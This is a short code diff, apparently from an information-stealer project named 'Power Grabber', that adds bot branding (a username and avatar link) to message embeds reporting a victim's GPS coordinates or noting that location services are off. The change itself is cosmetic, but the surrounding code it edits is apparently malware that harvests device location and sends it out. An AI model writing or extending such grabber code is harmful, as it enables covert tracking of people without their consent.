@@ -38,6 +38,8 @@ else:
         latitude, longitude = gps_info.split(" ")
     if latitude and longitude:
         embed = {
+            "username": "Power Grabber",
+            "avatar_url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true",
             "title": "🗺️ Location",
             "description": "GPS Coordinates",
             "fields": [
@@ -56,6 +58,8 @@ else:
         }
     else:
         embed = {
+            "username": "Power Grabber",
+            "avatar_url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true",
             "title": "🗺️ Location",
             "description": "Location Services are Off or GPS data unavailable.",
             "fields": [
